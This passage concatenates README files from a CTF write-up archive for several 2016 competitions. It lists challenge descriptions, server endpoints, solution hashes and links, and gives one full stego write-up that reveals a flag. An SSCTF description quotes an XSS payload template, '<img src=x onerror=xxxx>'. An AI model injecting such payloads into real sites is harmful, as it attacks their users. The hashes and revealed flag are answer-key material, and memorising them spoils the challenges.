    * f669c49720b22a194d1a70b894134b95aa33b7ef05c59b5dd24019de189416d0ed791e2d3938b1987dc97ce892521373ccce886ca08cbf3b01a4490295245882

**Hint**
I think Hindley and Milner had something to say about this...


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# sCTF 2016 Q1 : kobayashi-maru-200

**Category:** Pwning
**Points:** 200
**Solves:** 10
**Description:**

The bomb (see: bomb_squad) was pretty simple. But they hid a secret in there, and it's not solvable! Can you break in and win in the face of an unwinnable challenge?

    nc problems2.2016q1.sctf.io 1340

**File**
[bomb_squad](https://github.com/ctfs/write-ups-2016/tree/master/sctf-2016-q1/reversing/bomb-squad-130/bomb_squad)

SHA512 Solution Hash(es):
* 570298146e7f4cf1cfdcff4db5fa3d000da44963e621d5c03acbd8cd70f4d6414e292e06d28996bc73d52f9812548660738f639fbb08e8f71b9135e900a11464



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# sCTF 2016 Q1 : pwn1-70

**Category:** Pwning
**Points:** 70
**Solves:** 191
**Description:**

I'll convert a first person statement to a second person statement. I even wrote it in C++ to be super-safe about my strings!

    nc problems2.2016q1.sctf.io 1337


SHA512 Solution Hash(es):
* f03c2a545de36b05bd047dab022866c5f2da37d90c8b950fcce227a9b660d8066a8c95a2da877d2847e47e6d8dad5e8b61583662f52b972e7ef39ee4b3a41465


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/VulnHub/ctf-writeups/blob/master/2016/sctf/pwn1.md
# sCTF 2016 Q1 : pwn2-120

**Category:** Pwning
**Points:** 120
**Solves:** 56
**Description:**

Update: A system call was changed to allow the binary to work on some 32 bit systems. This doesn't change the flag or how it's solved. Only enables 32 bit compatibility on those systems.

Echo servers are easy stuff, right?

    nc problems2.2016q1.sctf.io 1338


SHA512 Solution Hash(es):
* faf43bbbbd1d7cfaf25685743b3d3b254d2e5aa2121827478f40ef316c719077975183cd9e50b8acfd5f309583b27722e37acd4cd5f825a3d44195298d427d5e

**Hint**
You're gonna need your utility belt, full of gadgets, to solve this one.

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/VulnHub/ctf-writeups/blob/master/2016/sctf/pwn2.md
# sCTF 2016 Q1 : pwn3-160

**Category:** Pwning
**Points:** 160
**Solves:** 27
**Description:**

A nice, simple blogging system. Have fun!

    nc problems2.2016q1.sctf.io 1339


SHA512 Solution Hash(es):
* 06bf40491e7f540a4ace47715e17b1d87b1cf7a58f0666e59f8ff5cfb9a29f5c531b568eaa7cb4de6957c82b0874f89d103809c2916a2c992b6d7aa1a62f647a

**Hint**
If nobody can figure it out, I'll consider giving a hint ;)

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/VulnHub/ctf-writeups/blob/master/2016/sctf/pwn3.md
# sCTF 2016 Q1 write-ups

* <https://compete.sctf.io/2016q1/>
* [Scoreboard](https://ctftime.org/event/309) or [local alternative](scoreboard)

## Repo-local write-ups

* none yet

## External write-ups only

* [reversing/bomb-squad-130](reversing/bomb-squad-130)
* [reversing/cookies-75](reversing/cookies-75)
* [reversing/secure-text-saver-60](reversing/secure-text-saver-60)
* [reversing/unbrewed-85](reversing/unbrewed-85)
* [reversing/rev1-20](reversing/rev1-20)
* [reversing/rev2-45](reversing/rev2-45)
* [forensic/banana-boy-20](forensic/banana-boy-20)
* [forensic/rain-or-shine-35](forensic/rain-or-shine-35)
* [forensic/musical-penguins-45](forensic/musical-penguins-45)
* [forensic/failed-compression-80](forensic/failed-compression-80)
* [crypto/vertinet-140](crypto/vertinet-140)
* [crypto/when-in-rome-10](crypto/when-in-rome-10)
* [crypto/lengthy-lingo-35](crypto/lengthy-lingo-35)
* [crypto/ed25519-40](crypto/ed25519-40)
* [crypto/verticode-90](crypto/verticode-90)
* [algorithmic/pesky-permutations-170](algorithmic/pesky-permutations-170)
* [algorithmic/tracking-85](algorithmic/tracking-85)
* [algorithmic/png-number-100](algorithmic/png-number-100)
* [algorithmic/space-friends-200](algorithmic/space-friends-200)
* [algorithmic/deblink-100](algorithmic/deblink-100)
* [pwning/pwn2-120](pwning/pwn2-120)
* [pwning/pwn1-70](pwning/pwn1-70)
* [pwning/pwn3-160](pwning/pwn3-160)
* [prog-lang/i-cant-get-no-satisfaction-130](prog-lang/i-cant-get-no-satisfaction-130)
* [prog-lang/check-em-160](prog-lang/check-em-160)
* [web/president-40](web/president-40)
* [web/obfuscation-180](web/obfuscation-180)
* [web/ducks-30](web/ducks-30)
* [web/control-panel-40](web/control-panel-40)

## Missing write-ups

* [reversing/unbrewed2-electric-boogaloo-200](reversing/unbrewed2-electric-boogaloo-200)
* [forensic/corruption-100](forensic/corruption-100)
* [crypto/pythagoras-hash-100](crypto/pythagoras-hash-100)
* [algorithmic/schensted-110](algorithmic/schensted-110)
* [pwning/kobayashi-maru-200](pwning/kobayashi-maru-200)
* [prog-lang/whats-that-type-190](prog-lang/whats-that-type-190)
* [prog-lang/can-nerds-fly-100](prog-lang/can-nerds-fly-100)
* [web/scrambled-crypt2-135](web/scrambled-crypt2-135)
* [web/scrambled-crypt-90](web/scrambled-crypt-90)
# sCTF 2016 Q1 : bomb-squad-130

**Category:** Reversing
**Points:** 130
**Solves:** 48
**Description:**

Welcome to the bomb squad. Your first task is to diffuse this test bomb!

    nc problems2.2016q1.sctf.io 1340


SHA512 Solution Hash(es):
* 01192f7bee0035600d491befd129927dcae3015cd19abe9506024287f34277795b107e86811371efb67957f4f66d3362584a979482d9b0498b0d146fee7287e6


## Write-up

(TODO)

## Other write-ups and resources

* https://scylla.pw/bomb_squad/
# sCTF 2016 Q1 : cookies-75

**Category:** Reversing
**Points:** 75
**Solves:** 446
**Description:**

My mom put a password on the cookie jar :(

Will you help me get a cookie?


SHA512 Solution Hash(es):
* 724441837be250637567d622358b9e297aa20412774e32f2f9162137737618e7f3bf44f0ddef3744b95730ecf09a97aced

**Hint**
She left something in the code for debugging purposes... maybe that will help?


## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/sctf-2016-cookies/
* https://sardinachanx.gitbooks.io/sctf-2016q1-write-ups/content/cookies_75_pts.html
# sCTF 2016 Q1 : rev1-20

**Category:** Reversing
**Points:** 20
**Solves:** 685
**Description:**

Let's start out with an easy, typical reversing problem.

The answer will not be in the typical `sctf{flag}` format, so when you do get it, you must put it into the format by doing `sctf{flag_you_found}`

SHA512 Solution Hash(es):
* f2ba4902328a1dd0f1b2aea2309dfc90052d59ea62e80703d4be2c7c55159906788f27f2cd6d2dd9fbb8104546dde52b9346

## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/sctf-2016-rev1/
* https://github.com/HackThisCode/CTF-Writeups/tree/master/2016/SCTF/rev1
* https://www.youtube.com/watch?v=Gz_lMIqLjfo
* http://bryceandress.github.io/2016/04/11/sctf2016-rev1.html
# sCTF 2016 Q1 : rev2-45

**Category:** Reversing
**Points:** 45
**Solves:** 481
**Description:**

Little bit harder?

The answer will not be in the typical `sctf{flag}` format, so when you do get it, you must put it into the format by doing `sctf{flag_you_found}`

SHA512 Solution Hash(es):
* de87a95ed93bf672b079cb62694cb509e0c61b667aec79f905e322495e6dd62b62576de9b0ae5ccc618e3d4b80e0efd43


## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/sctf-2016-rev2/
* https://www.youtube.com/watch?v=Gz_lMIqLjfo
* http://bryceandress.github.io/2016/04/12/sctf2016-rev2.html
# sCTF 2016 Q1 : secure-text-saver-60

**Category:** Reversing
**Points:** 60
**Solves:** 484
**Description:**

Will you test out my new program for me? It saves important info and keeps it away from prying eyes!


SHA512 Solution Hash(es):
* ac1d80b6a6fadfa7c2c97c2bd90b91092ea1c6bcb5cad34b0c04a6f7c7b27f4c8f1696c027237e811fa83d028bafea3b5fc98350313606082969b0205584ffcd

**Hint**
I've already made an account, so don't take my username or steal my texts!


## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/VulnHub/ctf-writeups/blob/master/2016/sctf/secure_text_saver.md
# sCTF 2016 Q1 : unbrewed-85

**Category:** Reversing
**Points:** 85
**Solves:** 11 
**Description:**

Bah, I feel like my programming skills really aren't up to snuff. I can never seem to get my decryption programs to work right... Can you figure this out for me?


SHA512 Solution Hash(es):
* 783dea3e72f76767b40cb8ddd432cab2d532020610e0d807419cd1a275b1311a813f29bf07deeca92844f9d2dec39f0fbf88a0e7f15ab487970cdd9f9eaad48f

**Hint**
Unlike pour-over, this coffee can be unbrewed.


## Write-up

(TODO)

## Other write-ups and resources

* https://sardinachanx.gitbooks.io/sctf-2016q1-write-ups/content/unbrewed_85_pts.html
* http://ipushino.blogspot.com/2016/04/sctf-2016-q-unbrewed-85-pts.html
# sCTF 2016 Q1 : unbrewed2-electric-boogaloo-200

**Category:** Reversing
**Points:** 200
**Solves:** 0
**Description:**

It's honestly getting embarrassing how much this happens to me. But, you've done such a good job of figuring out my decryption programs so far. Can you fix this one for me, too?


SHA512 Solution Hash(es):
* 748e85511263b811096becf9d9806a2dd19528bd217e1e2106b6c86ea29c20505b3a3c37a0db144dce8c1949be3843d58f6131fd7d7623f91a31b386b05404c4

**Hint**
Second verse, same as the first.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# sCTF 2016 Q1 : control-panel-40

**Category:** Web
**Points:** 40
**Solves:** 154
**Description:**

Take control... of the flag on this [admin control panel](http://cpanel.sctf.michaelz.xyz/).


SHA512 Solution Hash(es):
* d89eaa383966fd1db14e52515e8da5e92d860738b182921ef6ee104add519d3d97099a374a6dfc15e514be14833d6d0838108c090c09b4c18b7f667bfafbfad8
* 70ef6d29514ca86b06c01dd4c3cc10321ce1b63f115a407cb13a8207aca0c2a5ec7724595e53815baf997afd705d353097c02b80b3f221a5b1112d2506cca984

**Hint**
There are more hints in the comments.

## Write-up

(TODO)

## Other write-ups and resources

* http://marcosvalle.github.io/ctf/2016/04/15/sctf2016-control-panel.html
* https://github.com/HackThisCode/CTF-Writeups/tree/master/2016/SCTF/Control-Panel
* https://youtu.be/RPvhU9Wj_aA
* http://www.sateam.net/2016/04/sctf-2016-q1.html
# sCTF 2016 Q1 : ducks-30

**Category:** Web
**Points:** 30
**Solves:** 608
**Description:**

The ducks and I have a unfinished score to settle.


SHA512 Solution Hash(es):
* 592fe3f24308a2a8fdeb37087fc70d96d6bc8b709696eb770a6384128edb2eeacb13b2efae0716c1b0aef43bfefe5559fcf68234c7916043f289f8107b9a2e48
* 246982e511d4edd146a1f5aeda1cb6097f6bce8eb6b759519a684c32afc4f76f49f89cd168cab73a3b4fa49c20bc5cfe5eeb7fb02f6b047f379c25d1df353688

**Hint**
If you've remember HSF, you'll know that The Ducks is unsolvable.

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/318br/sctf/tree/master/2016q1/Ducks
* http://www.sateam.net/2016/04/sctf-2016-q1.html
* https://youtu.be/wcYcb5ogJoo
* https://github.com/HackThisCode/CTF-Writeups/tree/master/2016/SCTF/Ducks
* http://blog.oleaass.com/writeups/sctf-2016-ducks/
# sCTF 2016 Q1 : obfuscation-180

**Category:** Web
**Points:** 180
**Solves:** 41
**Description:**

A couple of changes were made to the problem:
* There are more restrictions since it's been updated.
* Multiple solutions may work, but only one of them makes sense as a flag.

Return of the [obfuscat](http://obfuscation.sctf.michaelz.xyz/)!

SHA512 Solution Hash(es):
* e6f1fd38b4ff7feac0f658f10ec08fb2ef90f7645862e84d1603cb37e7d5987e5e32e7db378f7b8a878239ec7b54ac2db118b790c652aa039861ec43e40ab6d0
* 88b11cd1756d963b8d54865e9b02790c9138c0a4b57914287c6de09c20f0b870df0e056b255d2c31e16baee19260cc64311c8f0b65417268cb991bba06b91970

**Hint**
There are more hints in the comments.

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/sternze/CTF_writeups/blob/master/sCTF/2016_Q1/obfuscat/readme.md
# sCTF 2016 Q1 : president-40

**Category:** Web
**Points:** 40
**Solves:** 109
**Description:**

I just created a [site](http://president.sctf.michaelz.xyz/) with a list of popular presidential candidates!


SHA512 Solution Hash(es):
* 7a255dc90fbf83489e992f8eca025d25e2d7c90e03cc2656c32858524b75095c646e25ff0fc22e02c57b9c40c0b39aeb602b20af5ad520146d627d9597751013
* db9f803431414adc62ccf9bf9b484330b216ab0d943737ced933ca6100b0ffc468f5b423fcbbd662f63a40f0b7a4dc42430309c1be8277d1c4948d043960285a

**Hint**
Where do you think the names are being stored?

## Write-up

(TODO)

## Other write-ups and resources

* http://blog.oleaass.com/writeups/sctf-2016-presidents/
# sCTF 2016 Q1 : scrambled-crypt-90

**Category:** Web
**Points:** 90
**Solves:** 13
**Description:**

Try my little [puzzle](http://scramblecrypt.sctf.michaelz.xyz/)!


SHA512 Solution Hash(es):
* 81ae8d35b6a7a8a270833bcc799966f2b8ce754f4faeb7388269c4fe980fe2c14f231adfc8498db4d6c88508b80f9028fe4a5b30c43dcb16a299fd9c498ecf4e
* 76d20fd7368a82119d35ceb3a5bb2a8c756bf1470dac2f0931dceca62250d55c571c467be1a8106b1f77327790dd448730d259d128bfc9ef2138293522ff380f

**Hint**
Sure, it's random, but it's [deterministic](https://en.wikipedia.org/wiki/Deterministic_algorithm) too.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# sCTF 2016 Q1 : scrambled-crypt2-135

**Category:** Web
**Points:** 135
**Solves:** 7
**Description:**

Back for [more](http://scramblecrypt2.sctf.michaelz.xyz/)?


SHA512 Solution Hash(es):
* b51d4c30eb7fecb2e5720c2db2ede47ec59825e101260599cd2e8e6e306d2257dffc305059fca53a6660340759ae05b1a2080453aad8b539d09bc913b981f928
* 9732f43d9d1b511f694f6acfd34e4bba7c6e156c70ef8632e85eca0a9fe6dda0ff7efd5ae504b481fde102cf4b9437da74af9a9d4c0ff49106872f1176e56f84

**Hint**
I love using Mersenne Twister.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Securinets CTF Quals 2016 : crypto1-100

**Category:** Crypto
**Points:** 100
**Solves:** 
**Description:**

    qv, sgytx :U !! acg scw xyg udtum nfd !!! htpn'l kigof.
    nin hvusdky mlv usodhw trth : Maug xltwzv bal ,
    zv'g zdn mlv uoyt weyv twswn, bx'j c zuce,
    htvp wf phw cfw kuaf ymef gabymlzpu ;) !

## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/MrMugiwara/WriteupsCTF/tree/master/CTFsecuriNets2016
# Securinets CTF Quals 2016 : mem-dump-90

**Category:** Forensic
**Points:** 90
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/MrMugiwara/WriteupsCTF/blob/master/CTFsecuriNets2016/MemDump.md
# Securinets CTF Quals 2016 write-ups

* <TODO>
* [Scoreboard](TODO) or [local alternative](scoreboard)

## Repo-local write-ups

* none yet

## External write-ups only

* [reverse/reverse-400](reverse/reverse-400)
* [forensic/mem-dump-90](forensic/mem-dump-90)
* [crypto/crypto1-100](crypto/crypto1-100)
* [web/session-hash-400](web/session-hash-400)

## Missing write-ups

* none yet
# Securinets CTF Quals 2016 : reverse-400

**Category:** Reverse
**Points:** 400
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://dali-mrabet1.rhcloud.com/securinet-2016-reverse400-write-up/
# Securinets CTF Quals 2016 : session-hash-400

**Category:** Web
**Points:** 400
**Solves:** 
**Description:**

I can not wait. I need this treasure

## Write-up

(TODO)

## Other write-ups and resources

* http://ctfsecurinets.github.io/ctf-securinets-quals-2016/web400_session_hash/
# Security Fest 2016 : qrack-100

**Category:** Misc
**Points:** 100
**Solves:** 
**Description:**

We recovered this from a crashed spaceship. All we know is that aliens love QR, but we humans hate it…

## Write-up

(TODO)

## Other write-ups and resources

* https://ctf.rip/securityfest-2016-ctf-qrack-misc-challenge/
# Security Fest 2016 : shalien-250

**Category:** Misc
**Points:** 250
**Solves:** 
**Description:**

We have found some files. We don't know how to decipher them in order to read the password. Can you help us?

## Write-up

(TODO)

## Other write-ups and resources

* https://www.assured.se/blog/2016/6/11/writeup-for-the-securityfest-2016-ctf-challenge-shalien
# Security Fest 2016 : flagship-100

**Category:** Pwn
**Points:** 100
**Solves:** 
**Description:**

This ship has some valuable intel. Pwn it!

    nc pwn2.securityfest.ctf.rocks 1337


## Write-up

(TODO)

## Other write-ups and resources

* https://gist.github.com/73696e65/69b6485b767ba83f3b85435808729fe9#file-flagship-pwn-py
# Security Fest 2016 : propaganda-300

**Category:** Pwn
**Points:** 300
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Security Fest 2016 : tvstation-100

**Category:** Pwn
**Points:** 100
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://gist.github.com/73696e65/69b6485b767ba83f3b85435808729fe9#file-tv-station-pwn-py
* https://github.com/chamli/Write_Up_Ctf/blob/master/securityfest2016/pwn100_tvstation.md
# Security Fest 2016 write-ups

* <https://securityfest.ctf.rocks/>
* [Scoreboard](TODO) or [local alternative](scoreboard)

## Repo-local write-ups

* none yet

## External write-ups only

* [pwn/tvstation-100](pwn/tvstation-100)
* [pwn/flagship-100](pwn/flagship-100)
* [reverse/flux-100](reverse/flux-100)
* [misc/shalien-250](misc/shalien-250)
* [misc/qrack-100](misc/qrack-100)
* [web/xss2-200](web/xss2-200)

## Missing write-ups

* [pwn/propaganda-300](pwn/propaganda-300)
* [web/space-xss1-100](web/space-xss1-100)
# Security Fest 2016 : flux-100

**Category:** Reverse
**Points:** 100
**Solves:** 
**Description:**

This license tool came with some software we recovered from a battle. Please figure it out for us.
File: [flux-rev.rar](https://github.com/ctfs/write-ups-2016/tree/master/security-fest-2016/reverse/flux-100/flux-rev.rar)

## Write-up

(TODO)

## Other write-ups and resources

* http://gurwindersingh.in/activitytracker/blog/2016/06/02/flux-rev-writeup-for-securityfest16-ctf/
* https://youtu.be/BU1emIEv3Ek
# Security Fest 2016 : space-xss1-100

**Category:** Web
**Points:** 100
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Security Fest 2016 : xss2-200

**Category:** Web
**Points:** 200
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://ctftime.org/writeup/3448
# SSCTF 2016 : Chain Rule 200

**Category:** Crypto-Exploit
**Points:** 200
**Solves:** 47
**Description:**

> 该题目已有 47 个队伍完成
> 
> It has completed by 47 teams
> 
> 解题说明
> 
> Description
> 
> 
> Try 'start'
> 
> 战题链接 <http://static.lab.seclover.com/crypto/crypto2-b7486602.zip>


## Write-up

One of the files has password "start". Inside that file there is text document with another password (that password is unbrutable). Decrypting files one by one gives us 2 zip files: *flag.zip* and *pwd.zip* and message, telling us to look for flag and pwd.

*flag.zip* is password-protected too. *pwd.zip* is unprotected and contains 6140 text files, one is named *start.txt*, and other have numerical names. In every file except the last one there's a link to the next one or two files ("next is xxxxxx[ , or yyyyyy]"). Walking through this linked list (using breadth-first search and marking visited files) we visit every file and in the last one we get message, telling us to pay attention to comments and avoid blackhole.

Blackhole is an infinite loop, to which we get if we do not mark visited files. And what comments? There were no comments if the files, except the first and the last one. At the end I found out that most of txt files in *pwd.zip* had a comment inside zip-archive. These comments were " " or "\t". If we collect all the comments while walking though the graph, and assume that " " == 0 and "\t" == 1, we get a string of bytes in BigEndian:

>b"\x01^\xb8\x94k\xe6\nh\xf8e\xcbEIi\x98s\xc7\xad#\xc6*\xb7=\x83U\x95P\xeb\xcd[-\xf8\x86\xf4V\xc7\\#\x9f&9\xd0\xbe\rrE\xd57\xffG\xb6k\xb5[\xe9u.\x1b\xf2\xc2F\xd5\x10q\xf6yt\x02@\xd6\xe6\x0e\x91\xbb\x95\xb3u\x14\x14B\xbc\x1d\xab/\xb1\xbdb\xbe\xca\xe3\xf7\x19\xf7\xce>\x0c\xb4\xcdsK\xb9C\x020\xe1\x0c\x98\xfc\xcd\x8b\x8f\xf6\xdf\x94\x01`\xae\x92\xcc\xfe\x8d\xbd\xb1M\xdcP\xe5\xe1\x17\xb7<Z\xd8_d\x1c{\x95XQ\xd1 \x903\n\xc3\x08C\nor\xf9\x98)\x7f\xeco\xa6v%\x11\xaeRa\xd9.\xb2\xa5\x8d\xe2\xb7\x88\x11\x1d\xcd\x15Nhen I am dead, my dearest,\nSing no sad songs for me;\nPlant thou no roses at my head,\nNor shady cypress tree:\nBe the green grass above me\nWith showers and dewdrops wet:\nAnd if thou wilt, remember,\nAnd if thou wilt, forget.\n\npassword part1:Thispasswordistoolong\n\nI shall not see the shadows,\nI shall not see the rain;\nI shall not hear the nightingle\nSing on as if in pain:\nAnd dreaming through the twilight\nThat doth not rise nor set,\nHaply I may remember,\nAnd haply I may forget.\n\npassword part2:andyoudon'twanttocrackitbybruteforce\n\nThat's all."

Decripting *flag.zip* with password: "Thispasswordistoolongandyoudon'twanttocrackitbybruteforce" gives us the flag: Flag is SSCTF{Somewhere_Over_The_Rainbow}

PS IMHO this challenge was interesting, but it wasn't crypto at all. The first part was coding, and the second was stego.

Code for getting password from pwd.zip in [chain_rule_2.py](chain_rule_2.py)

## Other write-ups and resources

* none yet
# SSCTF 2016 : HeHeDa

**Category:** Crypto-Exploit
**Points:** 100
**Solves:** 183
**Description:**

> 该题目已有 183 个队伍完成
> 
> It has completed by 183 teams
> 
> 解题说明
> 
> Description
> 
> 
> Crack Algorithm~
> 
> 战题链接 <http://static.lab.seclover.com/crypto/Algorithm1-577265e1.zip>


## Write-up

(TODO)

## Other write-ups and resources

* [https://github.com/tothi/ctfs/tree/master/ssctf-2016/crypto-exploit/heheda-100](https://github.com/tothi/ctfs/tree/master/ssctf-2016/crypto-exploit/heheda-100)
* <http://abaptista.github.io/2016/02/29/ssctf-writeup/>
# SSCTF 2016 : Nonogram

**Category:** Crypto-Exploit
**Points:** 300
**Solves:** 14
**Description:**

> 该题目已有 14 个队伍完成
> 
> It has completed by 14 teams
> 
> 解题说明
> 
> Description
> 
> 
> Game Time Is Coming
> 
> socket.lab.seclover.com:52700
> 
> socket2.lab.seclover.com:52700
> 
> 战题链接 socket://socket.lab.seclover.com:52700


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# SSCTF 2016 : Pwn-1

**Category:** Crypto-Exploit
**Points:** 400
**Solves:** 31
**Description:**

> 该题目已有 31 个队伍完成
> 
> It has completed by 31 teams
> 
> 解题说明
> 
> Description
> 
> 
> The File glibc.so Give You
> 
> The Rest Depend On You
> 
> pwn.lab.seclover.com:11111
> 
> 战题链接 <http://static.lab.seclover.com/crypto/pwn1-fb39ccfa.zip>


## Write-up

(TODO)

## Other write-ups and resources

* [http://uaf.io/exploitation/2016/02/28/SSCTF-PWN-400.html](http://uaf.io/exploitation/2016/02/28/SSCTF-PWN-400.html)
* <http://err0r-451.ru/ssctf-crypto-task-1-100pts/>
# SSCTF 2016 : Pwn-2

**Category:** Crypto-Exploit
**Points:** 600
**Solves:** 20
**Description:**

> 该题目已有 20 个队伍完成
> 
> It has completed by 20 teams
> 
> 解题说明
> 
> Description
> 
> 
> The File glibc.so Give You
> 
> The Rest Depend On You
> 
> pwn.lab.seclover.com:22222
> 
> 战题链接 <http://static.lab.seclover.com/crypto/pwn2-58461176.zip>


## Write-up

(TODO)

## Other write-ups and resources

* [http://uaf.io/exploitation/2016/02/28/SSCTF-PWN-600.html](http://uaf.io/exploitation/2016/02/28/SSCTF-PWN-600.html)
# SSCTF 2016 : Hungry Game

**Category:** Misc
**Points:** 300
**Solves:** 119
**Description:**

> 该题目已有 119 个队伍完成
> 
> It has completed by 119 teams
> 
> 解题说明
> 
> Description
> 
> 
> Let's Play Hungry Game
> 
> <http://socket.lab.seclover.com>
> 
> <http://socket2.lab.seclover.com>
> 
> 战题链接 <http://socket.lab.seclover.com/>


## Write-up

(TODO)

## Other write-ups and resources

* [https://www.youtube.com/watch?v=zSXiQhWCq6A](https://www.youtube.com/watch?v=zSXiQhWCq6A)
# SSCTF 2016 : Puzzle

**Category:** Misc
**Points:** 200
**Solves:** 6
**Description:**

> 该题目已有 6 个队伍完成
> 
> It has completed by 6 teams
> 
> 解题说明
> 
> Description
> 
> 
> Listen To Music
> 
> 战题链接 <http://misc3-346e2a33.seclover.com/>


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# SSCTF 2016 : Speed Data

**Category:** Misc
**Points:** 100
**Solves:** 97
**Description:**

> 
> 该题目已有 97 个队伍完成
> 
> It has completed by 97 teams
> 
> 解题说明
> 
> Description
> 
> 
> Please Get Digital Evidence
> 
> 战题链接 <http://static.lab.seclover.com/misc/misc2-ecac0a7e.zip>


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.youtube.com/watch?v=ZFs58z_OzGw>
# SSCTF 2016 : Warrior And Tower III

**Category:** Misc
**Points:** 400
**Solves:** 4
**Description:**

> 该题目已有 4 个队伍完成
> 
> It has completed by 4 teams
> 
> 解题说明
> 
> Description
> 
> 
> socket.lab.seclover.com:23333
> 
> socket2.lab.seclover.com:23333
> 
> 战题链接 socket://socket.lab.seclover.com:23333


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# SSCTF 2016 : Welcome

**Category:** Misc
**Points:** 10
**Solves:** 456
**Description:**

> 该题目已有 454 个队伍完成
> 
> It has completed by 454 teams
> 
> 解题说明
> 
> Description
> 
> 
> Welcome To Participate SSCTF
> 
> 战题链接 <http://weibo.com/u/5508834167>


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# SSCTF 2016 write-ups

* <http://lab.seclover.com/index>
* [Scoreboard](http://lab.seclover.com/status) or [local alternative](./scoreboard)

## Completed write-ups

* [crypto-exploit/chain-rule-200](crypto-exploit/chain-rule-200)

## External write-ups only

* [crypto-exploit/heheda-100](crypto-exploit/heheda-100)
* [crypto-exploit/pwn-1-400](crypto-exploit/pwn-1-400)
* [crypto-exploit/pwn-2-600](crypto-exploit/pwn-2-600)
* [misc/hungry-game-300](misc/hungry-game-300)
* [misc/speed-data-100](misc/speed-data-100)
* [reverse/re1-100](reverse/re1-100)
* [reverse/re2-200](reverse/re2-200)
* [reverse/re5-500](reverse/re5-500)
* [web/can-you-hit-me-200](web/can-you-hit-me-200)
* [web/legend-legend-300](web/legend-legend-300)

## Missing write-ups

* [crypto-exploit/nonogram-300](crypto-exploit/nonogram-300)
* [misc/puzzle-200](misc/puzzle-200)
* [misc/warrior-and-tower-3-400](misc/warrior-and-tower-3-400)
* [misc/welcome-10](misc/welcome-10)
* [reverse/re3-300](reverse/re3-300)
* [reverse/re4-400](reverse/re4-400)
* [web/afsrc-market-500](web/afsrc-market-500)
* [web/flag-man-400](web/flag-man-400)
* [web/up-up-up-100](web/up-up-up-100)
# SSCTF 2016 : Re1

**Category:** Reverse
**Points:** 100
**Solves:** 83
**Description:**

> 该题目已有 83 个队伍完成
> 
> It has completed by 83 teams
> 
> 解题说明
> 
> Description
> 
> 
> Null
> 
> 战题链接 <http://static.lab.seclover.com/re/re1-e7e4ad1a.zip>


## Write-up

(TODO)

## Other write-ups and resources

* <https://www.youtube.com/watch?v=8-yyvyh3PVM>
# SSCTF 2016 : Re2

**Category:** Reverse
**Points:** 200
**Solves:** 53
**Description:**

> 该题目已有 53 个队伍完成
> 
> It has completed by 53 teams
> 
> 解题说明
> 
> Description
> 
> 
> Do You Like Bad Apple
> 
> 战题链接 <http://static.lab.seclover.com/re/re2-db4ae13a.zip>


## Write-up

(TODO)

## Other write-ups and resources

* [b01lers](https://b01lers.net/challenges/SSCTF%202016/re2/90/)
# SSCTF 2016 : Re3

**Category:** Reverse
**Points:** 300
**Solves:** 32
**Description:**

> 该题目已有 32 个队伍完成
> 
> It has completed by 32 teams
> 
> 解题说明
> 
> Description
> 
> 
> I Am The Prompt。
> 
> 战题链接 <http://static.lab.seclover.com/re/re3-d0b6ccbd.zip>


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# SSCTF 2016 : Re4

**Category:** Reverse
**Points:** 400
**Solves:** 14
**Description:**

> 该题目已有 14 个队伍完成
> 
> It has completed by 14 teams
> 
> 解题说明
> 
> Description
> 
> 
> I Am The Prompt。
> 
> 战题链接 <http://static.lab.seclover.com/re/re4-150fc703.zip>


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# SSCTF 2016 : Re5

**Category:** Reverse
**Points:** 500
**Solves:** 0
**Description:**

> 该题目已有 0 个队伍完成
> 
> It has completed by 0 teams
> 
> 解题说明
> 
> Description
> 
> 
> I Am The Prompt。
> 
> 战题链接 <http://static.lab.seclover.com/re/re5-d06bc342.zip>


## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.rewolf.pl/blog/?p=1519>
# SSCTF 2016 : AFSRC-Market

**Category:** Web
**Points:** 500
**Solves:** 16
**Description:**

> AFSRC-Market
> 
> 该题目已有 16 个队伍完成
> 
> It has completed by 16 teams
> 
> 解题说明
> 
> Description
> 
> 
> Welcome To AFSRC-Market
> 
> Let's Shopping~
> 
> 战题链接 <http://edb24e7c.seclover.com/>


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# SSCTF 2016 : Can You Hit Me?

**Category:** Web
**Points:** 200
**Solves:** 96
**Description:**

> Can You Hit Me？
> 
> 该题目已有 96 个队伍完成
> 
> It has completed by 96 teams
> 
> 解题说明
> 
> Description
> 
> 
> Hit Hit Hit
> 
> 
> 本题的Payload请发送至ctf5@seclover.com，格式如下
> 
> 【Web02---邮箱---队名】
> 
> ---------------
> 
> 证明图片
> 
> Payload
> 
> 
> Please send payload to the ctf5@seclover.com,format:
> 
> 【Web02---Your_Emai---Your_Teamname】
> 
> -------------
> 
> Picture proof
> 
> Payload
> 
> 
> For example:
> 
> 【Web02-admin@seclover.com-Seclover】
> 
> ------------
> 
> This is a Picture
> 
> <img src=x onerror=xxxx>
> 
> 战题链接<http://960a23aa.seclover.com/>


## Write-up

(TODO)

## Other write-ups and resources
